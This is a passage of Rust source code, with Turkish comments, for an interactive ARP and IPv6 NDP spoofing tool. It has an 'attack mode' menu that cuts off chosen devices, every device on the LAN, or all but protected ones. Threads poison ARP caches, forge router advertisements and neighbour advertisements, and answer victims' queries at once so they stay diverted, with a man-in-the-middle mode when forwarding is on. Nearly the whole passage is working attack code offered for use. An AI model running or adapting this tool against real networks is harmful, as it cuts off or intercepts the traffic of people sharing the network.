                            sender_mac,
                            sender_ip,
                            ArpOperations::Reply,
                        );
                        let _ = t.send_to(&buf, None);
                    }
                } else if !is_from_us {
                    // Mod bazli anlik cevap filtresi:
                    //  - TEK HEDEF: sadece kilitli cihazlara, sadece gateway icin.
                    //  - HEDEF HARIC HERKES: korunan cihazlar disindaki herkese cevap ver.
                    //  - HERKES: tum cihazlara cevap ver.
                    let pinned = shared.pinned_targets();
                    let allowed = if !pinned.is_empty() {
                        pinned.iter().any(|(_, m)| *m == sender_mac) && target_ip == net.gateway_ip
                    } else {
                        let excluded = shared.excluded_targets();
                        excluded.is_empty() || !excluded.iter().any(|(_, m)| *m == sender_mac)
                    };
                    if allowed {
                        if let Ok(mut t) = tx.try_lock() {
                            build_arp_spoof(
                                &mut buf,
                                net.local_mac,
                                sender_mac,
                                net.local_mac,
                                target_ip,
                                sender_mac,
                                sender_ip,
                                ArpOperations::Reply,
                            );
                            let _ = t.send_to(&buf, None);
                            shared.instant_replies.fetch_add(1, Ordering::Relaxed);
                            shared.spoof_packets.fetch_add(1, Ordering::Relaxed);
                        }
                    }
                }
            }

            // IPv6 NDP: gateway'in link-local adresi için gelen NS'lere anında
            // solicited NA ile cevap ver. Bu, komşu kaydını REACHABLE tutar ve
            // cihazın NUD probe'larında gerçek gateway'e dönmesini engeller.
            if let Some(router_v6) = net.gateway_ipv6 {
                if let Some((src_v6, src_mac, target_v6)) = extract_icmpv6_ns(packet, net.local_mac)
                {
                    if target_v6 == router_v6 {
                        let pinned = shared.pinned_targets();
                        let allowed = if !pinned.is_empty() {
                            pinned.iter().any(|(_, m)| *m == src_mac)
                        } else {
                            let excluded = shared.excluded_targets();
                            excluded.is_empty() || !excluded.iter().any(|(_, m)| *m == src_mac)
                        };
                        if allowed {
                            if let Ok(mut t) = tx.try_lock() {
                                let len = build_ndp_na(
                                    &mut v6_buf,
                                    net.local_mac,
                                    src_mac,
                                    router_v6,
                                    src_v6,
                                    router_v6,
                                    net.local_mac,
                                    true,
                                    true,
                                );
                                let _ = t.send_to(&v6_buf[..len], None);
                                shared.instant_replies.fetch_add(1, Ordering::Relaxed);
                                shared.spoof_packets.fetch_add(1, Ordering::Relaxed);
                            }
                        }
                    }
                }
            }

            if let Some((ip, mac)) = extract_arp_sender(packet, net.local_mac) {
                if ip != net.gateway_ip && ip != net.local_ip && net.in_subnet(ip) {
                    // Mod bazli takip filtresi: korunan/kilitli cihazlar listeye girmez.
                    let pinned = shared.pinned_targets();
                    let allowed = if !pinned.is_empty() {
                        pinned.iter().any(|(_, m)| *m == mac)
                    } else {
                        let excluded = shared.excluded_targets();
                        excluded.is_empty() || !excluded.iter().any(|(_, m)| *m == mac)
                    };
                    if allowed {
                        if let Ok(mut targets) = shared.targets.lock() {
                            targets.insert(ip, mac);
                        }
                    }
                }
            }

            // IPv6 takibi tum modlarda yapilir; hedefli modlarda yalnizca
            // kesilecek cihazlarin adresleri kaydedilir (korunanlar haric).
            if net.local_ipv6.is_some() {
                if let Some((ipv6, mac)) = extract_ipv6_sender(packet, net.local_mac) {
                    if Some(ipv6) != net.gateway_ipv6
                        && Some(ipv6) != net.local_ipv6
                        && mac != net.gateway_mac
                    {
                        let pinned = shared.pinned_targets();
                        let allowed = if !pinned.is_empty() {
                            pinned.iter().any(|(_, m)| *m == mac)
                        } else {
                            let excluded = shared.excluded_targets();
                            excluded.is_empty() || !excluded.iter().any(|(_, m)| *m == mac)
                        };
                        if allowed {
                            if let Ok(mut targets) = shared.targets_v6.lock() {
                                targets.insert(ipv6, mac);
                            }
                        }
                    }
                }
            }
        }

        shared.reader_alive.store(false, Ordering::SeqCst);
        dbg("reader thread exited");
    })
}

fn spawn_spoof_sender(
    tx: Arc<Mutex<Box<dyn DataLinkSender>>>,
    shared: Arc<Shared>,
    net: Arc<NetworkInfo>,
) -> thread::JoinHandle<()> {
    thread::spawn(move || {
        let mut arp_buf = [0u8; PACKET_SIZE];
        let mut v6_buf = [0u8; IPV6_PACKET_SIZE];
        let cycle_dur = Duration::from_millis(SPOOF_INTERVAL_MS);
        let pacing = Duration::from_micros(TX_PACING_US);
        // Tek hedef modu: IPv4 paketleri yalnizca kilitli cihazlarin MAC adreslerine gider.
        let single = shared.pinned_mode();
        // "Herkesi kes" modunda IPv6, RA/NA katmana yayilarak kesilir. Hedefli
        // modlarda ise yalnizca kesilecek cihazlara unicast NA gonderilir;
        // boylece korunan cihazlar etkilenmez.
        let v6_broadcast = !single && !shared.excluded_mode();
        let mut cycle_no: u64 = 0;

        while shared.running.load(Ordering::SeqCst) {
            let cycle_start = Instant::now();

            let targets_v4: Vec<(Ipv4Addr, MacAddr)> = shared
                .targets
                .lock()
                .map(|t| t.iter().map(|(k, v)| (*k, *v)).collect())
                .unwrap_or_default();

            {
                let mut sent: u64 = 0;

                for (target_ip, target_mac) in &targets_v4 {
                    if !shared.running.load(Ordering::SeqCst) {
                        break;
                    }

                    build_arp_spoof(
                        &mut arp_buf,
                        net.local_mac,
                        *target_mac,
                        net.local_mac,
                        net.gateway_ip,
                        *target_mac,
                        *target_ip,
                        ArpOperations::Reply,
                    );
                    // Kilidi yalnızca gönderim anında tut; bekleme kilidin dışında
                    // olsun ki reader'ın anlık cevapları kaçmasın.
                    if let Ok(mut t) = tx.lock() {
                        let _ = t.send_to(&arp_buf, None);
                    }
                    sent += 1;
                    thread::sleep(pacing);

                    // Tek hedef modunda gateway'e zehir paketi GONDERILMEZ;
                    // boylece paketler yalnizca secilen MAC adresine gider.
                    if !single {
                        build_arp_spoof(
                            &mut arp_buf,
                            net.local_mac,
                            net.gateway_mac,
                            net.local_mac,
                            *target_ip,
                            net.gateway_mac,
                            net.gateway_ip,
                            ArpOperations::Reply,
                        );
                        if let Ok(mut t) = tx.lock() {
                            let _ = t.send_to(&arp_buf, None);
                        }
                        sent += 1;
                        thread::sleep(pacing);
                    }
                }
                shared.spoof_packets.fetch_add(sent, Ordering::Relaxed);
            }

            if let (Some(our_v6), Some(router_v6)) = (net.local_ipv6, net.gateway_ipv6) {
                if v6_broadcast {
                    // "Herkesi kes": RA + NA katmana yayilir.
                    let targets_v6: Vec<Ipv6Addr> = shared
                        .targets_v6
                        .lock()
                        .map(|t| t.keys().copied().collect())
                        .unwrap_or_default();

                    {
                        let mut sent: u64 = 0;

                        let len = build_ndp_ra(&mut v6_buf, net.local_mac, router_v6, 1800);
                        if let Ok(mut t) = tx.lock() {
                            let _ = t.send_to(&v6_buf[..len], None);
                        }
                        sent += 1;
                        thread::sleep(pacing);

                        let len = build_ndp_na(
                            &mut v6_buf,
                            net.local_mac,
                            ALL_NODES_MAC,
                            router_v6,
                            ALL_NODES_V6,
                            router_v6,
                            net.local_mac,
                            true,
                            false,
                        );
                        if let Ok(mut t) = tx.lock() {
                            let _ = t.send_to(&v6_buf[..len], None);
                        }
                        sent += 1;
                        thread::sleep(pacing);

                        for target_v6 in &targets_v6 {
                            if !shared.running.load(Ordering::SeqCst) {
                                break;
                            }
                            let len = build_ndp_na(
                                &mut v6_buf,
                                net.local_mac,
                                ALL_NODES_MAC,
                                *target_v6,
                                ALL_NODES_V6,
                                *target_v6,
                                net.local_mac,
                                false,
                                false,
                            );
                            if let Ok(mut t) = tx.lock() {
                                let _ = t.send_to(&v6_buf[..len], None);
                            }
                            sent += 1;
                            thread::sleep(pacing);
                        }

                        shared.spoof_packets.fetch_add(sent, Ordering::Relaxed);
                    }
                } else {
                    // Hedefli modlar: "gateway'in IPv6 adresi benim MAC'imde"
                    // diyen unicast NA yalnizca kesilecek cihazlara gonderilir.
                    // Boylece kesilecek cihazin IPv6 varsayilan yolu de coker.
                    let pinned = shared.pinned_targets();
                    let excluded = shared.excluded_targets();
                    let targets_v6: Vec<(Ipv6Addr, MacAddr)> = shared
                        .targets_v6
                        .lock()
                        .map(|t| t.iter().map(|(k, v)| (*k, *v)).collect())
                        .unwrap_or_default();

                    {
                        let mut sent: u64 = 0;

                        for (victim_v6, victim_mac) in &targets_v6 {
                            if !shared.running.load(Ordering::SeqCst) {
                                break;
                            }
                            let is_victim = if !pinned.is_empty() {
                                pinned.iter().any(|(_, m)| m == victim_mac)
                            } else {
                                excluded.is_empty()
                                    || !excluded.iter().any(|(_, m)| m == victim_mac)
                            };
                            if !is_victim {
                                continue;
                            }

                            let len = build_ndp_na(
                                &mut v6_buf,
                                net.local_mac,
                                *victim_mac,
                                router_v6,
                                *victim_v6,
                                router_v6,
                                net.local_mac,
                                true,
                                false,
                            );
                            if let Ok(mut t) = tx.lock() {
                                let _ = t.send_to(&v6_buf[..len], None);
                            }
                            sent += 1;
                            thread::sleep(pacing);
                        }

                        // IPv6 adresi henuz ogrenilmemis hedef varsa ff02::1'e
                        // echo istegi at. Tum IPv6 dugumleri kendi link-local
                        // adreslerinden cevap verir; cevaplardan hedefi ogreniriz.
                        if cycle_no.is_multiple_of(DISCOVERY_ECHO_CYCLES)
                            && shared.v6_discovery_needed()
                        {
                            let len = build_icmpv6_echo_request(
                                &mut v6_buf,
                                net.local_mac,
                                our_v6,
                                ALL_NODES_V6,
                                (cycle_no & 0xffff) as u16,
                            );
                            if let Ok(mut t) = tx.lock() {
                                let _ = t.send_to(&v6_buf[..len], None);
                            }
                            sent += 1;
                            thread::sleep(pacing);
                        }

                        shared.spoof_packets.fetch_add(sent, Ordering::Relaxed);
                    }
                }
            }

            cycle_no = cycle_no.wrapping_add(1);

            let elapsed = cycle_start.elapsed();
            if elapsed < cycle_dur {
                let remaining_ms = (cycle_dur - elapsed).as_millis() as u64;
                interruptible_sleep(&shared, remaining_ms);
            }
        }

        shared.sender_alive.store(false, Ordering::SeqCst);
        dbg("sender thread exited");
    })
}

fn spawn_background_scanner(
    tx: Arc<Mutex<Box<dyn DataLinkSender>>>,
    shared: Arc<Shared>,
    net: Arc<NetworkInfo>,
) -> thread::JoinHandle<()> {
    thread::spawn(move || {
        while shared.running.load(Ordering::SeqCst) {
            interruptible_sleep(&shared, SCAN_INTERVAL_MS);
            if !shared.running.load(Ordering::SeqCst) {
                break;
            }
            scan_full_subnet(&tx, &net, Duration::from_millis(BG_SCAN_WAIT_MS), &shared);
            shared.scan_cycles.fetch_add(1, Ordering::SeqCst);
        }

        shared.bg_alive.store(false, Ordering::SeqCst);
        dbg("bg scanner thread exited");
    })
}

fn spawn_display(shared: Arc<Shared>, net: Arc<NetworkInfo>) -> thread::JoinHandle<()> {
    thread::spawn(move || {
        let anim = ["|", "/", "-", "\\"];
        let mut idx = 0usize;
        while shared.running.load(Ordering::SeqCst) {
            let t4 = shared.targets.lock().map(|g| g.len()).unwrap_or(0);
            let t6 = shared.targets_v6.lock().map(|g| g.len()).unwrap_or(0);
            let cycles = shared.scan_cycles.load(Ordering::SeqCst);
            let packets = shared.spoof_packets.load(Ordering::Relaxed);
            let instant = shared.instant_replies.load(Ordering::Relaxed);
            let elapsed = shared.start_time.elapsed();
            let mins = elapsed.as_secs() / 60;
            let secs = elapsed.as_secs() % 60;
            let fwd = ip_forward_enabled();

            print!("\x1B[2J\x1B[H");
            println!("==================================================");
            println!("🚀 ARP + NDP SPOOF (HIBRIT MOD)");
            println!("==================================================");
            println!("🌐 Gateway IPv4: {} ({})", net.gateway_ip, net.gateway_mac);
            println!(
                "🌐 Gateway IPv6: {}",
                net.gateway_ipv6
                    .map(|a| a.to_string())
                    .unwrap_or_else(|| "yok".into())
            );
            println!("💻 Local IPv4:   {} ({})", net.local_ip, net.local_mac);
            println!(
                "💻 Local IPv6:   {}",
                net.local_ipv6
                    .map(|a| a.to_string())
                    .unwrap_or_else(|| "yok".into())
            );
            println!("🔧 Interface:    {}", net.interface.name);
            let pinned = shared.pinned_targets();
            let excluded = shared.excluded_targets();
            if !pinned.is_empty() {
                if pinned.len() == 1 {
                    let (ip, mac) = pinned[0];
                    println!("🎯 Mod:          TEK HEDEF → {} ({})", ip, mac);
                } else {
                    println!("🎯 Mod:          ÇOKLU HEDEF ({} cihaz)", pinned.len());
                    for (ip, mac) in &pinned {
                        println!("                   • {} ({})", ip, mac);
                    }
                }
            } else if !excluded.is_empty() {
                if excluded.len() == 1 {
                    let (ip, mac) = excluded[0];
                    println!(
                        "🎯 Mod:          HERKES HARİÇ → {} ({}) (korunuyor)",
                        ip, mac
                    );
                } else {
                    println!(
                        "🎯 Mod:          HERKES HARİÇ ({} cihaz korunuyor)",
                        excluded.len()
                    );
                    for (ip, mac) in &excluded {
                        println!("                   • {} ({})", ip, mac);
                    }
                }
            } else {
                println!("🎯 Mod:          HERKES (tüm ağ)");
            }
            match fwd {
                Some(true) => println!("ℹ️  ip_forward=1 → MITM modu"),
                Some(false) => println!("⚠️  ip_forward=0 → trafik düşer, bağlantı kesilir"),
                None => println!("❔ ip_forward: bilinmiyor"),
            }
            println!("--------------------------------------------------");
            println!();
            println!("{} Hibrit spoofing aktif...", anim[idx]);
            println!("📱 IPv4 cihaz:             {}", t4);
            println!("📱 IPv6 cihaz:             {}", t6);
            println!("📤 Toplam paket:           {}", packets);
            println!("⚡ Anlık cevap:            {}", instant);
            println!("🔄 Arka plan tarama turu:  {}", cycles);
            println!("⏱️  Geçen süre:            {:02}:{:02}", mins, secs);
            println!();
            println!("⏹️  Durdurmak için: Ctrl+C");

            idx = (idx + 1) % anim.len();
            thread::sleep(Duration::from_millis(500));
        }

        shared.display_alive.store(false, Ordering::SeqCst);
        dbg("display thread exited");
    })
}

fn restore_network(
    tx: &Arc<Mutex<Box<dyn DataLinkSender>>>,
    shared: &Arc<Shared>,
    net: &NetworkInfo,
) {
    let t_restore_start = Instant::now();
    dbg("--- restore_network START ---");

    println!("\n==================================================");
    println!("🛑 UYGULAMA DURDURULUYOR");
    println!("==================================================");
    println!("🔧 ARP + NDP kayıtları geri yükleniyor...");
    let _ = std::io::stdout().flush();

    let t = Instant::now();
    let targets_v4: Vec<(Ipv4Addr, MacAddr)> = shared
        .targets
        .lock()
        .map(|g| g.iter().map(|(k, v)| (*k, *v)).collect())
        .unwrap_or_default();
    dbg(&format!(
        "targets_v4 snapshot: {} cihaz, {:?}",
        targets_v4.len(),
        t.elapsed()
    ));

    let t = Instant::now();
    let targets_v6: Vec<(Ipv6Addr, MacAddr)> = shared
        .targets_v6
        .lock()
        .map(|g| g.iter().map(|(k, v)| (*k, *v)).collect())
        .unwrap_or_default();
    dbg(&format!(
        "targets_v6 snapshot: {} cihaz, {:?}",
        targets_v6.len(),
        t.elapsed()
    ));

    let mut arp_buf = [0u8; PACKET_SIZE];
    let mut v6_buf = [0u8; IPV6_PACKET_SIZE];
    let pacing = Duration::from_micros(500);
    // Tek hedef modunda gateway'in IPv4 kaydi hic zehirlenmedi.
    let single = shared.pinned_mode();
    // "Herkesi kes" modunda v6 katmana yayin yapildi; hedefli modlarda ise
    // yalnizca kesilecek cihazlara unicast NA gonderildi.
    let v6_broadcast = !single && !shared.excluded_mode();

    // LOCK'U BİR KEZ AL, TÜM RESTORE BOYUNCA TUT
    let t_lock = Instant::now();
    let mut t = match tx.lock() {
        Ok(g) => g,
        Err(_) => {
            dbg("tx.lock() poisoned, aborting restore");
            return;
        }
    };
    dbg(&format!("tx.lock() acquired in {:?}", t_lock.elapsed()));

    // --- IPv4 ARP restore ---
    let t_v4 = Instant::now();
    let mut v4_sent = 0u64;
    for (target_ip, target_mac) in &targets_v4 {
        build_arp_spoof(
            &mut arp_buf,
            net.gateway_mac,
            *target_mac,
            net.gateway_mac,
            net.gateway_ip,
            *target_mac,
            *target_ip,
            ArpOperations::Reply,
        );
        for _ in 0..5 {
            let _ = t.send_to(&arp_buf, None);
            v4_sent += 1;
            thread::sleep(pacing);
        }

        build_arp_spoof(
            &mut arp_buf,
            *target_mac,
            net.gateway_mac,
            *target_mac,
            *target_ip,
            net.gateway_mac,
            net.gateway_ip,
            ArpOperations::Reply,
        );
        if !single {
            for _ in 0..5 {
                let _ = t.send_to(&arp_buf, None);
                v4_sent += 1;
                thread::sleep(pacing);
            }
        }
    }
    dbg(&format!(
        "IPv4 restore done: {} cihaz, {} paket, {:?}",
        targets_v4.len(),
        v4_sent,
        t_v4.elapsed()
    ));

    // --- IPv6 NDP restore ---
    let t_v6 = Instant::now();
    let mut v6_sent = 0u64;
    if let (Some(_), Some(router_v6)) = (net.local_ipv6, net.gateway_ipv6) {
        if v6_broadcast {
            for (target_v6, _) in &targets_v6 {
                let len = build_ndp_na(
                    &mut v6_buf,
                    net.gateway_mac,
                    ALL_NODES_MAC,
                    router_v6,
                    ALL_NODES_V6,
                    router_v6,
                    net.gateway_mac,
                    true,
                    false,
                );
                for _ in 0..5 {
                    let _ = t.send_to(&v6_buf[..len], None);
                    v6_sent += 1;
                    thread::sleep(pacing);
                }

                let len = build_ndp_na(
                    &mut v6_buf,
                    net.gateway_mac,
                    ALL_NODES_MAC,
                    *target_v6,
                    ALL_NODES_V6,
                    *target_v6,
                    net.gateway_mac,
                    false,
                    false,
                );
                for _ in 0..3 {
                    let _ = t.send_to(&v6_buf[..len], None);
                    v6_sent += 1;
                    thread::sleep(pacing);
                }
            }
        } else {
            // Hedefli modlarda yalnizca o cihazlara unicast duzeltme NA'si
            // gonderilir: gateway'in IPv6 adresi tekrar gateway MAC'ine
            // isaret etsin. Boylece hedefin IPv6 yolu geri acilir.
            let pinned = shared.pinned_targets();
            let excluded = shared.excluded_targets();
            for (target_v6, target_mac) in &targets_v6 {
                let is_victim = if !pinned.is_empty() {
                    pinned.iter().any(|(_, m)| m == target_mac)
                } else {
                    excluded.is_empty() || !excluded.iter().any(|(_, m)| m == target_mac)
                };
                if !is_victim {
                    continue;
                }

                let len = build_ndp_na(
                    &mut v6_buf,
                    net.local_mac,
                    *target_mac,
                    router_v6,
                    *target_v6,
                    router_v6,
                    net.gateway_mac,
                    true,
                    false,
                );
                for _ in 0..5 {
                    let _ = t.send_to(&v6_buf[..len], None);
                    v6_sent += 1;
                    thread::sleep(pacing);
                }
            }
        }
    }
    dbg(&format!(
        "IPv6 restore done: {} cihaz, {} paket, {:?}",
        targets_v6.len(),
        v6_sent,
        t_v6.elapsed()
    ));

    drop(t);
    dbg(&format!("tx.lock() released"));

    println!(
        "✅ Kurtarma tamamlandı: {} IPv4, {} IPv6 cihaz",
        targets_v4.len(),
        targets_v6.len()
    );
    let _ = std::io::stdout().flush();

    dbg(&format!(
        "--- restore_network END, total {:?} ---",
        t_restore_start.elapsed()
    ));
}

fn print_welcome() {
    print!("\x1B[2J\x1B[H");
    println!("==================================================");
    println!("🚀 ARP + NDP SPOOF (Hibrit, IPv4 + IPv6)");
    println!("==================================================");
    println!("🔄 Uygulama başlatılıyor...");
    println!("⏳ Lütfen bekleyin");
    println!("==================================================");
    thread::sleep(Duration::from_millis(1200));
}

/// Açılışta saldırı modunu sorar.
fn ask_attack_mode() -> AttackMode {
    loop {
        print!("\x1B[2J\x1B[H");
        println!("==================================================");
        println!("🎯 SALDIRI MODU SEÇİMİ");
        println!("==================================================");
        println!("  1) Yalnızca hedef cihazları kes      (bir veya daha fazla cihaz seç)");
        println!("  2) Herkesi kes                       (tüm ağdaki cihazlar)");
        println!("  3) Belirli hedef HARİÇ herkesi kes   (bir veya daha fazla cihaz koru)");
        println!("==================================================");
        print!("👉 Seçim [1/2/3]: ");
        let _ = std::io::stdout().flush();

        let mut line = String::new();
        let n = std::io::stdin().read_line(&mut line).unwrap_or(0);
        if n == 0 {
            println!("\n⚠️  Giriş okunamadı (EOF), varsayılan mod: 2) Herkesi kes");
            return AttackMode::Everyone;
        }

        match line.trim() {
            "1" => return AttackMode::Single,
            "2" => return AttackMode::Everyone,
            "3" => return AttackMode::ExceptOne,
            "" => {
                println!("❌ Boş giriş yaptın, 1, 2 veya 3 gir.");
                thread::sleep(Duration::from_millis(900));
            }
            other => {
                println!("❌ Geçersiz seçim: '{}'  (1, 2 veya 3)", other);
                thread::sleep(Duration::from_millis(900));
            }
        }
    }
}

/// Terminali ham (raw) moda alan ve kapsam dışına çıkınca eski haline
/// döndüren koruyucu. Böylece ok tuşları satır beklemeden okunabilir.
struct RawMode {
    original: libc::termios,
}

impl RawMode {
    fn enable() -> Option<Self> {
        unsafe {
            let mut term: libc::termios = std::mem::zeroed();
            if libc::tcgetattr(libc::STDIN_FILENO, &mut term) != 0 {
                return None;
            }
            let original = term;
            // Yalnızca girdi tarafını değiştir: satır tamponu ve echo kapalı,
            // ama Ctrl+C (ISIG) ve çıktı satır sonları (OPOST) çalışmaya devam eder.
            term.c_lflag &= !(libc::ICANON | libc::ECHO);
            term.c_iflag &= !(libc::IXON | libc::IXOFF);
            term.c_cc[libc::VMIN] = 1;
            term.c_cc[libc::VTIME] = 0;
            if libc::tcsetattr(libc::STDIN_FILENO, libc::TCSANOW, &term) != 0 {
                return None;
            }
            Some(Self { original })
        }
    }
}

impl Drop for RawMode {
    fn drop(&mut self) {
        unsafe {
            libc::tcsetattr(libc::STDIN_FILENO, libc::TCSANOW, &self.original);
        }
    }
}

/// Terminalin satır sayısı (alınamazsa 24).
fn terminal_rows() -> usize {
    let mut ws: libc::winsize = unsafe { std::mem::zeroed() };
    let rc = unsafe { libc::ioctl(libc::STDOUT_FILENO, libc::TIOCGWINSZ, &mut ws) };
    if rc == 0 && ws.ws_row > 0 {
        ws.ws_row as usize
    } else {
        24
    }
}

enum Key {
    Up,
    Down,
    Space,
    Enter,
    Clear,
    Quit,
    Other,
}

fn poll_stdin(timeout_ms: i32) -> bool {
    let mut pfd = libc::pollfd {
        fd: libc::STDIN_FILENO,
        events: libc::POLLIN,
        revents: 0,
    };
    let rc = unsafe { libc::poll(&mut pfd, 1, timeout_ms) };
    rc > 0 && (pfd.revents & libc::POLLIN) != 0
}

fn read_stdin_byte() -> Option<u8> {
    let mut b = 0u8;
    let n = unsafe {
        libc::read(
            libc::STDIN_FILENO,
            &mut b as *mut u8 as *mut libc::c_void,
            1,
        )
    };
    if n == 1 {
        Some(b)
    } else {
        None
    }
}

/// `timeout_ms` boyunca tuş bekler. `None` = zaman aşımı; diğer durumlarda
/// tuş döner (ESC ve EOF iptal sayılır).
fn read_key(timeout_ms: i32) -> Option<Key> {
    if !poll_stdin(timeout_ms) {
        return None;
    }
    let b = match read_stdin_byte() {
        Some(v) => v,
        None => return Some(Key::Quit),
    };
    match b {
        0x1b => {
            // Ok tuşları: ESC [ A / ESC [ B (bazı terminaller ESC O A).
            if !poll_stdin(30) {
                return Some(Key::Other);
            }
            let b2 = match read_stdin_byte() {
                Some(v) => v,
                None => return Some(Key::Quit),
            };
            if b2 == b'[' || b2 == b'O' {
                if !poll_stdin(30) {
                    return Some(Key::Other);
                }
                return Some(match read_stdin_byte() {
                    Some(b'A') => Key::Up,
                    Some(b'B') => Key::Down,
                    Some(_) => Key::Other,
                    None => Key::Quit,
                });
            }
            Some(Key::Other)
        }
        b'\r' | b'\n' => Some(Key::Enter),
        b' ' => Some(Key::Space),
        b'k' | b'K' => Some(Key::Up),
        b'j' | b'J' => Some(Key::Down),
        b'c' | b'C' => Some(Key::Clear),
        b'q' | b'Q' => Some(Key::Quit),
        _ => Some(Key::Other),
    }
}

/// Ağdaki cihazları canlı bir liste halinde gösterir ve `prompt` metniyle
/// seçim yaptırır.
///
/// Ok tuşları (veya j/k) ile gezinilir, Boşluk imleçteki cihazı seçer ya da
/// seçimden çıkarır, Enter seçimi onaylar, 'c' seçimi temizler, 'q' iptal eder.
/// Seçim MAC adresine göre tutulduğu için liste yenilenip sıra değişse de
/// seçim ve imleç aynı cihazda kalır. Liste arka planda sürekli taranır.
fn choose_targets(
    shared: &Arc<Shared>,
    tx: &Arc<Mutex<Box<dyn DataLinkSender>>>,
    net: &Arc<NetworkInfo>,
    prompt: &str,
) -> Option<Vec<(Ipv4Addr, MacAddr)>> {
    // --- Arka planda sürekli tarama yapan thread ---
    let scanning = Arc::new(AtomicBool::new(true));
    let scan_thread = {
        let shared = shared.clone();
        let tx = tx.clone();
        let net = net.clone();
        let scanning = scanning.clone();
        thread::spawn(move || {
            while scanning.load(Ordering::SeqCst) && shared.running.load(Ordering::SeqCst) {
                scan_full_subnet(&tx, &net, Duration::from_millis(BG_SCAN_WAIT_MS), &shared);
                shared.scan_cycles.fetch_add(1, Ordering::SeqCst);

                let mut slept = 0u64;
                while slept < SCAN_INTERVAL_MS
                    && scanning.load(Ordering::SeqCst)
                    && shared.running.load(Ordering::SeqCst)
                {
                    thread::sleep(Duration::from_millis(100));
                    slept += 100;
                }
            }
        })
    };

    // Terminali ham moda al; fonksiyon dönünce (Drop) eski haline gelir.
    let raw_guard = RawMode::enable();

    let draw = |list: &[(Ipv4Addr, MacAddr)],
                selected: &[(Ipv4Addr, MacAddr)],
                cursor: usize,
                scroll: usize,
                visible: usize,
                note: Option<&str>| {
        print!("\x1B[2J\x1B[H");
        println!("==================================================");
        println!("📋 AĞDAKİ CİHAZLAR (otomatik taranıyor)");
        println!("==================================================");
        if list.is_empty() {
            println!("  ⚠️  Henüz cihaz bulunamadı, tarama sürüyor...");
        } else {
            println!("     {:<17} MAC ADRESİ", "IP ADRESİ");
            println!("  {}", "-".repeat(49));
            for (i, (ip, mac)) in list.iter().enumerate().skip(scroll).take(visible) {
                let mark = if selected.iter().any(|(_, m)| m == mac) {
                    "[x]"
                } else {
                    "[ ]"
                };
                let pointer = if i == cursor { ">" } else { " " };
                let line = format!("  {} {} {:<17} {}", pointer, mark, ip, mac);
                if i == cursor {
                    println!("\x1B[7m{}\x1B[0m", line);
                } else {
                    println!("{}", line);
                }
            }
            if list.len() > visible {
                println!(
                    "  ... {}-{} / {} ...",
                    scroll + 1,
                    (scroll + visible).min(list.len()),
                    list.len()
                );
            }
        }
        if !selected.is_empty() {
            println!("--------------------------------------------------");
            // Uzun seçim listesi ekranı taşırmasın diye kısalt.
            let mut ips: Vec<String> = selected
                .iter()
                .take(6)
                .map(|(ip, _)| ip.to_string())
                .collect();
            if selected.len() > 6 {
                ips.push(format!("… +{}", selected.len() - 6));
            }
            println!("✅ Seçilen ({}): {}", selected.len(), ips.join(", "));
        }
        if let Some(n) = note {
            println!("{}", n);
        }
        println!("--------------------------------------------------");
        println!("  ↑/↓ veya j/k: gezin    Boşluk: seç / seçimi kaldır");
        println!("  Enter: onayla    c: temizle    q: iptal");
        println!("==================================================");
        print!("👉 {}: ", prompt);
        let _ = std::io::stdout().flush();
    };

    // Seçim ve imleç MAC adresine göre tutulur; liste yenilenip sıra değişse
    // de aynı cihazda kalır.
    let mut selected: Vec<(Ipv4Addr, MacAddr)> = Vec::new();
    let mut cursor_mac: Option<MacAddr> = None;
    let mut cursor: usize = 0;
    let mut scroll: usize = 0;
    let mut last_list: Option<Vec<(Ipv4Addr, MacAddr)>> = None;
    let mut last_sel: Option<Vec<MacAddr>> = None;
    let mut last_cursor: Option<usize> = None;
    let mut note: Option<String> = None;

    let result = loop {
        if !shared.running.load(Ordering::SeqCst) {
            break None;
        }

        let mut list: Vec<(Ipv4Addr, MacAddr)> = shared
            .targets
            .lock()
            .map(|t| t.iter().map(|(k, v)| (*k, *v)).collect())
            .unwrap_or_default();
        list.sort_by_key(|(ip, _)| ip.octets());

        // Seçili bir cihazın IP'si değiştiyse güncelle.
        for sel in selected.iter_mut() {
            if let Some((ip, _)) = list.iter().find(|(_, m)| *m == sel.1) {
                sel.0 = *ip;
            }
        }

        // İmleci MAC adresine göre takip et; liste yenilenince kaymasın.
        if let Some(mac) = cursor_mac {
            if let Some(pos) = list.iter().position(|(_, m)| *m == mac) {
                cursor = pos;
            }
        }
        if list.is_empty() {
            cursor = 0;
        } else if cursor >= list.len() {
            cursor = list.len() - 1;
        }
        if cursor_mac.is_none() && !list.is_empty() {
            cursor_mac = Some(list[cursor].1);
        }

        // İmleç ekranda kalacak şekilde görünür pencereyi kaydır.
        // Sabit başlık/altbilgi ~14 satır tutuyor; kalanı listeye ayır.
        let visible = terminal_rows().saturating_sub(14).max(3);
        if cursor < scroll {
            scroll = cursor;
        }
        if cursor >= scroll + visible {
            scroll = cursor + 1 - visible;
        }
        if scroll > list.len().saturating_sub(visible) {
            scroll = list.len().saturating_sub(visible);
        }

        // Liste, seçim, imleç veya not değiştiyse ekranı tazele.
        let sel_macs: Vec<MacAddr> = selected.iter().map(|(_, m)| *m).collect();
        if note.is_some()
            || last_list.as_ref() != Some(&list)
            || last_sel.as_ref() != Some(&sel_macs)
            || last_cursor != Some(cursor)
        {
            draw(&list, &selected, cursor, scroll, visible, note.as_deref());
            last_list = Some(list.clone());
            last_sel = Some(sel_macs);
            last_cursor = Some(cursor);
            note = None;
        }

        match read_key(200) {
            None => {}
            Some(Key::Quit) => break None,
            Some(Key::Enter) => {
                if selected.is_empty() {
                    note =
                        Some("❌ Hiç cihaz seçmedin, Boşluk ile en az bir cihaz seç.".to_string());
                } else {
                    break Some(selected.clone());
                }
            }
            Some(Key::Space) => {
                if let Some(&entry) = list.get(cursor) {
                    if let Some(pos) = selected.iter().position(|(_, m)| *m == entry.1) {
                        selected.remove(pos);
                    } else {
                        selected.push(entry);
                    }
                }
            }
            Some(Key::Clear) => {
                selected.clear();
                note = Some("🧹 Seçim temizlendi.".to_string());
            }
            Some(Key::Up) => {
                if !list.is_empty() {
                    cursor = if cursor == 0 {
                        list.len() - 1
                    } else {
                        cursor - 1
                    };
                    cursor_mac = Some(list[cursor].1);
                }
            }
            Some(Key::Down) => {
                if !list.is_empty() {
                    cursor = (cursor + 1) % list.len();
                    cursor_mac = Some(list[cursor].1);
                }
            }
            Some(Key::Other) => {}
        }
    };

    // Seçim bitti; terminali tarama thread'i durmadan önce eski haline getir.
    drop(raw_guard);

    // Tarama thread'ini durdur ve tamamlanmasını bekle.
    scanning.store(false, Ordering::SeqCst);
    let _ = scan_thread.join();

    result
}

fn main() {
    if !has_cap_net_raw() {
